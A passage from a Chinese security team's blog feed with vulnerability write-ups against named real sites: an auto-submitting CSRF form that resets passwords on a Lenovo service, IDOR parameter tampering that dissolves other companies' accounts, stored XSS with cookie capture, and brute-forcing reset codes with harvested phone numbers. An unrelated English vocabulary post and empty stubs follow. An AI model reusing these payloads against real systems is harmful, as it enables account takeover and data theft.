alt="image_1cg3oaevv1q934pa1u1g1if418lc2d.png-84.8kB"></p><p>f、地址管理处可以xss</p><p><img src="http://static.zybuluo.com/1kbfree/ya2bf6ypnf6exd6l2bo3qk87/image_1cg3occi7lrp1ccvamgthu1jja2q.png" alt="image_1cg3occi7lrp1ccvamgthu1jja2q.png-18.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/4gv88bkmzsrl8daq2dqs6q0p/image_1cg3ocmmb1ci61glk4j3bgrdl937.png" alt="image_1cg3ocmmb1ci61glk4j3bgrdl937.png-62.7kB"></p><blockquote><p>可是只能x本地(self-xss)不太甘心 这个之前测试都是后台查看订单后才可以触发但是魔镜又贵 看了官网又挖不到支付漏洞宝宝不开心<br>然后下载app测试了一下 哈哈 来着购物车抓包</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/llyi39xq2fdiec3ds7maid34/image_1cg3oepri1oodro9qik38i19ns3k.png" alt="image_1cg3oepri1oodro9qik38i19ns3k.png-152.9kB"></p><p>g、修改num数量 1,-1</p><p><img src="http://static.zybuluo.com/1kbfree/2oyr7jbtm4mm7s113o2gijju/image_1cg3ojg8s1r2412ts1cu75j1l944h.png" alt="image_1cg3ojg8s1r2412ts1cu75j1l944h.png-34.7kB"></p><p><em>果然可以</em></p><p><img src="http://static.zybuluo.com/1kbfree/8zx2nrq78tdztyblltgccvl1/image_1cg3olo38nu41tcb1p3vskc1bj5b.png" alt="image_1cg3olo38nu41tcb1p3vskc1bj5b.png-158.9kB"></p><p>h、随后就到了支付宝付款界面ok 这里要是提交订单后台查看xss应该可以触发 但是莫有钱</p><p><img src="http://static.zybuluo.com/1kbfree/lt5h3qshb72za5e0kxbxf96s/image_1cg3omtmar5i1hv3meu1jmf1lgo5o.png" alt="image_1cg3omtmar5i1hv3meu1jmf1lgo5o.png-30.9kB"></p><p><em>这边密码爆破任意用户密码重置，因为之前我遍历了所有用户的信息包括手机号，这个可以配合一下直接重置任意用户咯，这里不做破坏就拿自己的来</em></p><p><img src="http://static.zybuluo.com/1kbfree/pze70o5bwsyjed2igr68on9a/image_1cg3oqb6i7nr6131ucf18k21qnh65.png" alt="image_1cg3oqb6i7nr6131ucf18k21qnh65.png-578.3kB"></p><p><em>虽然验证码是6位数的，但是60分钟应该够了</em></p><p><img src="http://static.zybuluo.com/1kbfree/26jig70v1s3sxp1bmksur1e4/image_1cg3or0iosjspdm1nh1151875q6i.png" alt="image_1cg3or0iosjspdm1nh1151875q6i.png-79kB"></p><h3 id="转载者想说的话"><a href="#转载者想说的话" class="headerlink" title="转载者想说的话"></a>转载者想说的话</h3><p>mmp，这个文章是我转载最难转载的一篇，没有之一，其中原因不多说，原文地址:<code>http://wy.daochuan.net/bug_detail.php?wybug_id=wooyun-2016-0198593</code></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 乌云历史文章 </category>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 支付漏洞 </tag>
            
            <tag> 越权漏洞 </tag>
            
            <tag> Xss漏洞 </tag>
            
            <tag> 密码逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>乌云某处逻辑错误导致越权</title>
      <link href="/2018/06/15/%E4%B9%8C%E4%BA%91%E6%9F%90%E5%A4%84%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E8%B6%8A%E6%9D%83/"/>
      <url>/2018/06/15/%E4%B9%8C%E4%BA%91%E6%9F%90%E5%A4%84%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E8%B6%8A%E6%9D%83/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>危害：厂商可查看所有自家漏洞提交者的乌云ID（包括路人甲）<br>漏洞等级：低危<br>提交时间：   2016-06-23 12:05</p></blockquote><a id="more"></a><ul><li>打开漏洞后，点击“给漏洞作者发送礼物”，通过抓包即可得到含有该漏洞提交者的whitehatid，相应链接为：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/actdo.php?action=sms&amp;do=giftremind&amp;corpid=1&amp;whitehatid=11111</span><br></pre></td></tr></table></figure><ul><li><p>id为1的厂商向whitehatid为11111的白帽子发送礼物接收提醒，因此提交此漏洞的白帽子whitehatid为11111.</p></li><li><p>在获取到白帽子的whitehatid后，只需找到一个地方能够对应到白帽子的乌云id即可；</p></li><li><p>可能获知whitehatid<->白帽子id的对应方法还有其他的，这里我仅用了下面这个来实现。</-></p></li><li><p>访问以下链接，向该白帽子索取联系方式（但无需白帽子确认）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/actdo.php?action=sms&amp;do=contactwhitehat&amp;whitehatid=11111</span><br></pre></td></tr></table></figure></li><li><p>接着继续访问以下链接提醒白帽子接收礼物</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/actdo.php?action=sms&amp;do=giftremind&amp;corpid=1&amp;whitehatid=11111</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>经测试发现，只要厂商曾经尝试索取白帽子联系方式后（不管是否成功获取），再提醒白帽子接收礼物，即可在厂商信息主页处看到给<em>**</em>发送礼物，此时白帽子的乌云ID就出来了。</p></blockquote><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 乌云历史文章 </category>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限失控 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>漏洞挖掘经验之联想游戏论坛存在&quot;奇异&quot;反射Xss</title>
      <link href="/2018/06/15/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%81%94%E6%83%B3%E6%B8%B8%E6%88%8F%E8%AE%BA%E5%9D%9B%E5%AD%98%E5%9C%A8%E5%A5%87%E5%BC%82%E5%8F%8D%E5%B0%84Xss/"/>
      <url>/2018/06/15/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%81%94%E6%83%B3%E6%B8%B8%E6%88%8F%E8%AE%BA%E5%9D%9B%E5%AD%98%E5%9C%A8%E5%A5%87%E5%BC%82%E5%8F%8D%E5%B0%84Xss/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部文章，禁止外泄!</p></blockquote><a id="more"></a><p>漏洞URL : <a href="http://bbs.lenovogame.com/bbs/common/topic/index.do?id=69153" target="_blank" rel="noopener">http://bbs.lenovogame.com/bbs/common/topic/index.do?id=69153</a></p><h5 id="0-我们开始打开漏洞的地址"><a href="#0-我们开始打开漏洞的地址" class="headerlink" title="0. 我们开始打开漏洞的地址"></a>0. 我们开始打开漏洞的地址</h5><p>这里是需要登录或者注册，到时候自己注册登录一下就可以看到如下这个界面了。  </p><p><img src="http://static.zybuluo.com/1kbfree/5q1rnqzod7l0u5w880tr4138/image_1cg1akgfq3mgi991adhp1e1jji2h.png" alt="image_1cg1akgfq3mgi991adhp1e1jji2h.png-80kB"></p><h5 id="1-插入Xss代码"><a href="#1-插入Xss代码" class="headerlink" title="1. 插入Xss代码"></a>1. 插入Xss代码</h5><p>在帖子的评论区域插入代码<code>&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;</code>,如图</p><p><img src="http://static.zybuluo.com/1kbfree/kiux3cmbuucemw9bgh5d8s9v/xss1.png" alt="xss1.png-56.2kB"></p><blockquote><p>说实话也是运气好，我这段代码很早以前就插进去了，在电脑版的网页中，没有弹窗，但换到手机版本却有奇效（大家一定要多多测试，不要漏掉每一个细节）  </p></blockquote><h5 id="2-打开帖子查看"><a href="#2-打开帖子查看" class="headerlink" title="2. 打开帖子查看"></a>2. 打开帖子查看</h5><p><img src="http://static.zybuluo.com/1kbfree/qdc1a2tlhck7lwmbxosmlvyo/xss2.png" alt="xss2.png"></p><p><em>点击帖子处后可以看到下图的效果</em></p><p><img src="http://static.zybuluo.com/1kbfree/h2enlt4rez4ndtcmbxm1i43u/xss3.png" alt="xss3.png"></p><p><em>可以看到这里已经弹窗了，那么我们再深入利用一下</em></p><p><img src="http://static.zybuluo.com/1kbfree/2gw9k41an74d6tca2j09mmkl/xss4.png" alt="xss4.png-48.2kB"></p><h5 id="3-接着查看下是否有接受到Cookie"><a href="#3-接着查看下是否有接受到Cookie" class="headerlink" title="3. 接着查看下是否有接受到Cookie"></a>3. 接着查看下是否有接受到<code>Cookie</code></h5><p><img src="http://static.zybuluo.com/1kbfree/vhuxoy6or7ts6uzyva6wgo5x/xss5.png" alt="xss5.png-221.7kB"></p><p><em>成功获取到<code>Cookie</code>，说明是存在<code>Xss</code>的</em></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 内部资料 </category>
          
          <category> 实战渗透 </category>
          
          <category> Web攻防 </category>
          
          <category> 作者：一条快乐的咸鱼 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Xss漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>漏洞挖掘经验之联想E采存在Csrf漏洞</title>
      <link href="/2018/06/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E8%81%94%E6%83%B3E%E9%87%87%E5%AD%98%E5%9C%A8Csrf%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/06/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E8%81%94%E6%83%B3E%E9%87%87%E5%AD%98%E5%9C%A8Csrf%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部资料，禁止外泄!</p></blockquote><div class="note info"><p>危害：当用户点击我( 攻击者 )构造好的Csrf Poc后，他们的密码就会修改成我( 攻击者 )设置好的密码~</p></div><a id="more"></a><h5 id="先注册两个账号，邮箱分别为-clickjacking-126-com-和-623425849-qq-com-其中-623425849-qq-com-的密码为-12345678aa"><a href="#先注册两个账号，邮箱分别为-clickjacking-126-com-和-623425849-qq-com-其中-623425849-qq-com-的密码为-12345678aa" class="headerlink" title="先注册两个账号，邮箱分别为 clickjacking@126.com 和 623425849@qq.com,其中 623425849@qq.com 的密码为 12345678aa"></a>先注册两个账号，邮箱分别为 <code>clickjacking@126.com</code> 和 <code>623425849@qq.com</code>,其中 <code>623425849@qq.com</code> 的密码为 <code>12345678aa</code></h5><h5 id="这里都按照正常流程操作-在忘记密码处输入用户名clickjacking-126-com"><a href="#这里都按照正常流程操作-在忘记密码处输入用户名clickjacking-126-com" class="headerlink" title="这里都按照正常流程操作,在忘记密码处输入用户名clickjacking@126.com"></a>这里都按照正常流程操作,在忘记密码处输入用户名<code>clickjacking@126.com</code></h5><p><img src="http://static.zybuluo.com/1kbfree/976m79f968l4kpmyxo0ddkil/csrf1.png" alt="csrf1.png-150.5kB"></p><h5 id="点下一步，输入邮箱发送过来的验证码"><a href="#点下一步，输入邮箱发送过来的验证码" class="headerlink" title="点下一步，输入邮箱发送过来的验证码."></a>点下一步，输入邮箱发送过来的验证码.</h5><p><img src="http://static.zybuluo.com/1kbfree/3dz32xyw0zcjrjwh6knhly5c/csrf2.png" alt="csrf2.png">  </p><h5 id="点下一步，输入新密码，抓包"><a href="#点下一步，输入新密码，抓包" class="headerlink" title="点下一步，输入新密码，抓包."></a>点下一步，输入新密码，抓包.</h5><p><img src="http://static.zybuluo.com/1kbfree/wuzoww8knv8h3te4v9om6dxl/csrf3.png" alt="csrf3.png-62kB"> </p><h5 id="将数据包制作成Csrf-Poc，如下"><a href="#将数据包制作成Csrf-Poc，如下" class="headerlink" title="将数据包制作成Csrf Poc，如下"></a>将数据包制作成Csrf Poc，如下</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">style</span>=<span class="string">"display:none;"</span> <span class="attr">name</span>=<span class="string">"px"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://vip.lenovo.com.cn/Account/ForgotPassword/UpdateForgotPassword"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"newPassword1"</span> <span class="attr">value</span>=<span class="string">"123456789aa&amp;#126;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"newPassword2"</span> <span class="attr">value</span>=<span class="string">"123456789aa&amp;#126;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"next"</span> <span class="attr">value</span>=<span class="string">"�&amp;#184;&amp;#139;�&amp;#184;&amp;#128;�&amp;#173;&amp;#165;"</span> /&gt;</span><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">document.px.submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="浏览器处打开html文件"><a href="#浏览器处打开html文件" class="headerlink" title="浏览器处打开html文件"></a>浏览器处打开html文件</h5><p><img src="http://static.zybuluo.com/1kbfree/jmb40prydeckzzz68mi2emir/csrf5.png" alt="csrf5.png-180.1kB"></p><h5 id="我们再输入原先的密码"><a href="#我们再输入原先的密码" class="headerlink" title="我们再输入原先的密码"></a>我们再输入原先的密码</h5><p><img src="http://static.zybuluo.com/1kbfree/po891mq5w5wh1gu86q811og9/csrf6.png" alt="csrf6.png-196.3kB"></p><p><em>可以看到是失败的</em></p><h5 id="输入新密码123456789aa"><a href="#输入新密码123456789aa" class="headerlink" title="输入新密码123456789aa~"></a>输入新密码123456789aa~</h5><p><img src="http://static.zybuluo.com/1kbfree/3ohrv1nmjq76k7nj6lc2wkjv/csrf7.png" alt="csrf7.png-90.6kB"></p><p><img src="http://static.zybuluo.com/1kbfree/tdsqvah6m2ux655zitc0olnz/csrf8.png" alt="csrf8.png-88.5kB"></p><p><em>发现可以登录，说明<code>Csrf</code>漏洞利用成功</em></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 内部资料 </category>
          
          <category> 实战渗透 </category>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 逻辑漏洞 </tag>
            
            <tag> Csrf漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>漏洞挖掘经验之联想两处越权漏洞</title>
      <link href="/2018/06/13/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%81%94%E6%83%B3%E4%B8%A4%E5%A4%84%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/06/13/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%81%94%E6%83%B3%E4%B8%A4%E5%A4%84%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部资料，禁止外泄！</p></blockquote><a id="more"></a><blockquote><p>漏洞Url：<a href="https://moc.lenovo.com" target="_blank" rel="noopener">https://moc.lenovo.com</a></p></blockquote><h3 id="联想某企业网站解散企业处越权漏洞"><a href="#联想某企业网站解散企业处越权漏洞" class="headerlink" title="联想某企业网站解散企业处越权漏洞"></a>联想某企业网站解散企业处越权漏洞</h3><h4 id="1-创建两个企业号，id分别为"><a href="#1-创建两个企业号，id分别为" class="headerlink" title="1. 创建两个企业号，id分别为"></a>1. 创建两个企业号，id分别为</h4><p>100645 and 100643</p><h4 id="2-打开url：https-moc-lenovo-com-moc-home-settings-do"><a href="#2-打开url：https-moc-lenovo-com-moc-home-settings-do" class="headerlink" title="2. 打开url：https://moc.lenovo.com/moc/home_settings.do"></a>2. 打开url：<a href="https://moc.lenovo.com/moc/home_settings.do" target="_blank" rel="noopener">https://moc.lenovo.com/moc/home_settings.do</a></h4><h4 id="3-点击解散企业"><a href="#3-点击解散企业" class="headerlink" title="3. 点击解散企业"></a>3. 点击解散企业</h4><p><img src="http://static.zybuluo.com/1kbfree/oa9zmjedsoiiorvkt99s3ltr/image_1cfsfh2dt176h1pn2sld6i9o7b9.png" alt="image_1cfsfh2dt176h1pn2sld6i9o7b9.png-83.5kB"></p><h4 id="4-在二次验证界面输入当前账号的密码并抓包"><a href="#4-在二次验证界面输入当前账号的密码并抓包" class="headerlink" title="4.在二次验证界面输入当前账号的密码并抓包"></a>4.在二次验证界面输入当前账号的密码并抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/wpbk7mxo2715g9t9sgizszin/image_1cfsfi6am5vevellgr111odu0m.png" alt="image_1cfsfi6am5vevellgr111odu0m.png-103.9kB"></p><h4 id="5-找到这个数据包，当前企业id为100643，将其改为100645"><a href="#5-找到这个数据包，当前企业id为100643，将其改为100645" class="headerlink" title="5.找到这个数据包，当前企业id为100643，将其改为100645."></a>5.找到这个数据包，当前企业id为100643，将其改为100645.</h4><p><img src="http://static.zybuluo.com/1kbfree/pi1pl028cqes8naw9k2vbiua/image_1cfsfit595029i01t8015nj14eg13.png" alt="image_1cfsfit595029i01t8015nj14eg13.png-138.4kB"></p><h4 id="6-发送成功"><a href="#6-发送成功" class="headerlink" title="6.发送成功"></a>6.发送成功</h4><p><img src="http://static.zybuluo.com/1kbfree/mxyejrecxwn3ng1m6cpf6lnn/image_1cfsfj5tc1579f9bcriluf1ac61g.png" alt="image_1cfsfj5tc1579f9bcriluf1ac61g.png-47.1kB"></p><h4 id="7-刚才id为100645的企业已被解散"><a href="#7-刚才id为100645的企业已被解散" class="headerlink" title="7.刚才id为100645的企业已被解散"></a>7.刚才id为100645的企业已被解散</h4><p><img src="http://static.zybuluo.com/1kbfree/sm2fy5bsv1ndgc3j6svaoos9/image_1cfsfjsk3a6e74psb619di1vdd1t.png" alt="image_1cfsfjsk3a6e74psb619di1vdd1t.png-701.3kB"></p><h3 id="创建企业处越权漏洞"><a href="#创建企业处越权漏洞" class="headerlink" title="创建企业处越权漏洞"></a>创建企业处越权漏洞</h3><blockquote><p>漏洞url/位置：<br><a href="https://moc.lenovo.com/moc/home_login_callback.do" target="_blank" rel="noopener">https://moc.lenovo.com/moc/home_login_callback.do</a></p></blockquote><h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><h5 id="1-创建两个账户，都不先不选择创建企业。"><a href="#1-创建两个账户，都不先不选择创建企业。" class="headerlink" title="1.创建两个账户，都不先不选择创建企业。"></a>1.创建两个账户，都不先不选择创建企业。</h5><h5 id="2-选择任一账户，点击创建企业："><a href="#2-选择任一账户，点击创建企业：" class="headerlink" title="2.选择任一账户，点击创建企业："></a>2.选择任一账户，点击创建企业：</h5><p><img src="http://static.zybuluo.com/1kbfree/d6k35h9m5saj9tu97dctcqlb/image_1cfsfm8b7om616ul158v1vku2qo2q.png" alt="image_1cfsfm8b7om616ul158v1vku2qo2q.png-115.8kB"></p><h5 id="3-此时抓包，数据包中有一个staff-login值，此时为13开头的账户，将其改为另外一个账户的账号："><a href="#3-此时抓包，数据包中有一个staff-login值，此时为13开头的账户，将其改为另外一个账户的账号：" class="headerlink" title="3.此时抓包，数据包中有一个staff_login值，此时为13开头的账户，将其改为另外一个账户的账号："></a>3.此时抓包，数据包中有一个staff_login值，此时为13开头的账户，将其改为另外一个账户的账号：</h5><p><img src="http://static.zybuluo.com/1kbfree/2kd8ys0gwz2ydbb5egxirj31/image_1cfsfnas31mu8163o1ljkjhn9og37.png" alt="image_1cfsfnas31mu8163o1ljkjhn9og37.png-262.6kB"></p><h5 id="4-发送成功，回显success"><a href="#4-发送成功，回显success" class="headerlink" title="4.发送成功，回显success"></a>4.发送成功，回显success</h5><p><img src="http://static.zybuluo.com/1kbfree/85pouzgb8f20xb43wkbxppdn/image_1cfsfnjikvvr1p2q92fsm4e533k.png" alt="image_1cfsfnjikvvr1p2q92fsm4e533k.png-27.8kB"></p><h5 id="5-登陆到另一个账户中，发现果然创建成功"><a href="#5-登陆到另一个账户中，发现果然创建成功" class="headerlink" title="5.登陆到另一个账户中，发现果然创建成功"></a>5.登陆到另一个账户中，发现果然创建成功</h5><p><img src="http://static.zybuluo.com/1kbfree/6ejbg8nl37l87b07j1gtr9kn/image_1cfsfnqpc72p1p5g1cephkm12b141.png" alt="image_1cfsfnqpc72p1p5g1cephkm12b141.png-35.9kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 内部资料 </category>
          
          <category> Web攻防 </category>
          
          <category> 作者：逗逗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 越权漏洞 </tag>
            
            <tag> 实战渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>英语词汇学习</title>
      <link href="/2018/06/07/%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/06/07/%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>巧用技巧来学习英语，让你更快记住单词，这是一个英语词汇必备的复习文章，持续更新中~</p></blockquote><a id="more"></a><h3 id="back"><a href="#back" class="headerlink" title="back"></a>back</h3><p>中文:后背<br>读音:ba(第四声)可</p><h3 id="bake"><a href="#bake" class="headerlink" title="bake"></a>bake</h3><p>中文:烘焙<br>读音:bei(第四声)可</p><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>中文:容易<br>读音:衣ji</p><h3 id="strong"><a href="#strong" class="headerlink" title="strong"></a>strong</h3><p>中文:强壮<br>读音:死状</p><h3 id="fee"><a href="#fee" class="headerlink" title="fee"></a>fee</h3><p>中文:费用<br>读音:fei(四)</p><h3 id="fly"><a href="#fly" class="headerlink" title="fly"></a>fly</h3><p>中文:飞<br>读音:福来<br>句子( 加深记忆 ):他的<strong>福</strong>气是 <em>飞</em> 过<strong>来</strong>的</p><h3 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h3><p>中文:离开<br>读音:离(四)唔</p><h3 id="sleeve"><a href="#sleeve" class="headerlink" title="sleeve"></a>sleeve</h3><p>中文:袖子<br>读音:使力舞</p><blockquote><p><code>leave</code>和<code>sleeve</code>造句：<br>悄悄的我leave(走了),正如我悄悄的来<br>我挥一挥sleeve(衣袖),不带走一片云彩</p></blockquote><h3 id="drag"><a href="#drag" class="headerlink" title="drag"></a>drag</h3><p>中文:拖、拽<br>读音：拽胳</p><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>中文：推<br>读音：怕使<br>图解：<img src="http://static.zybuluo.com/1kbfree/vyxzdviwmjaojm86av6axjko/image_1cfded7as1sro14rgf8r1j19hmr9.png" alt="image_1cfded7as1sro14rgf8r1j19hmr9.png-41.4kB"></p><h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h3><p>中文：拉<br>读音：po(四)<br>图解:<img src="http://static.zybuluo.com/1kbfree/whpxujlqnfq7awawvkaikval/image_1cfdefsm61dod14hn3vuuqt1em946.png" alt="image_1cfdefsm61dod14hn3vuuqt1em946.png-42.8kB"></p><h3 id="chart"><a href="#chart" class="headerlink" title="chart"></a>chart</h3><p>中文：图纸<br>读音：插纸</p><h3 id="cruel"><a href="#cruel" class="headerlink" title="cruel"></a>cruel</h3><p>中文：残酷<br>读音：哭咯<br>句子：因为现实很 <strong>残酷</strong> 所以他 <strong>哭咯</strong></p><h3 id="debt"><a href="#debt" class="headerlink" title="debt"></a>debt</h3><p>中文：债务<br>读音：贷te<br>句子：他欠了债务，所以有很多贷te等他还</p><h3 id="rude"><a href="#rude" class="headerlink" title="rude"></a>rude</h3><p>中文：粗鲁，无礼<br>读音：入的<br>句子：他不敲门就进 <strong>入</strong> 我的房间，这很 <strong>粗鲁</strong> ，很无礼</p><h3 id="fine"><a href="#fine" class="headerlink" title="fine"></a>fine</h3><p>中文: 好的 n.罚款<br>读音：fai(四)<br>句子：罚款只是为了你变 <strong>fine</strong>(好的)</p><h3 id="finance"><a href="#finance" class="headerlink" title="finance"></a>finance</h3><p>中文：金融<br>读音：犯难事<br>句子：金融方面遇到了问题，所以我犯难事</p><h3 id="deliver"><a href="#deliver" class="headerlink" title="deliver"></a>deliver</h3><p>中文：递送 分娩 发言<br>读音：递里我<br>句子：</p><ol><li>交出一个东西-&gt;递送</li><li>交出一个孩子-&gt;分娩</li><li>交出一个意见-&gt;发言</li></ol><h3 id="mud"><a href="#mud" class="headerlink" title="mud"></a>mud</h3><p>中文：泥<br>读音：骂的<br>句子：我浑身是泥，所以我给家长<strong>骂的</strong>哭了</p><h3 id="pet"><a href="#pet" class="headerlink" title="pet"></a>pet</h3><p>中文：宠物<br>读音：陪(四)它<br>句子：我养了一只宠物，我天天陪它</p><h3 id="pest"><a href="#pest" class="headerlink" title="pest"></a>pest</h3><p>中文：害虫<br>读音：拍死他<br>句子：这个害虫有毒，我要拍死他</p><h3 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h3><p>中文：礼物<br>读音：给(四)福特<br>句子：他礼物是给福特的</p><h3 id="respond"><a href="#respond" class="headerlink" title="respond"></a>respond</h3><p>中文：回答，答复<br>读音：瑞是棒的<br>句子：瑞同学回答了这个问题，所以大家都在喊瑞是棒的</p><h3 id="response"><a href="#response" class="headerlink" title="response"></a>response</h3><p>中文：响应<br>读音：瑞士胖死<br>句子：瑞士有一个人胖死了，政府没做出响应</p><h3 id="responsible"><a href="#responsible" class="headerlink" title="responsible"></a>responsible</h3><p>中文：尽责的<br>读音：瑞士胖死婆<br>句子：及时做出respond，他很尽责的</p><h3 id="correspond"><a href="#correspond" class="headerlink" title="correspond"></a>correspond</h3><p>中文：符合，通信</p><h3 id="terrible"><a href="#terrible" class="headerlink" title="terrible"></a>terrible</h3><p>中文：可怕的，糟糕的<br>读音：胎若爆<br>句子：在高速公路上，胎若爆了，就会很可怕</p><h3 id="terrify"><a href="#terrify" class="headerlink" title="terrify"></a>terrify</h3><p>中文：恐吓</p><h3 id="terror"><a href="#terror" class="headerlink" title="terror"></a>terror</h3><p>中文：恐怖<br>读音：泰罗<br>句子：程序又报错(error)了，真的是太恐怖了</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 英语学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> English </tag>
            
            <tag> 扩大业务必备技能 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>[TP5]自定义配置文件</title>
      <link href="/2018/06/06/TP5-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
      <url>/2018/06/06/TP5-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
      <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      
    </entry>
    
    <entry>
      <title>[TP5]扩展配置目录</title>
      <link href="/2018/06/06/TP5-%E6%89%A9%E5%B1%95%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95/"/>
      <url>/2018/06/06/TP5-%E6%89%A9%E5%B1%95%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95/</url>
      <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      
    </entry>
    
    <entry>
      <title>[TP5]配置文件格式</title>
      <link href="/2018/06/06/TP5-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
      <url>/2018/06/06/TP5-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
      <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
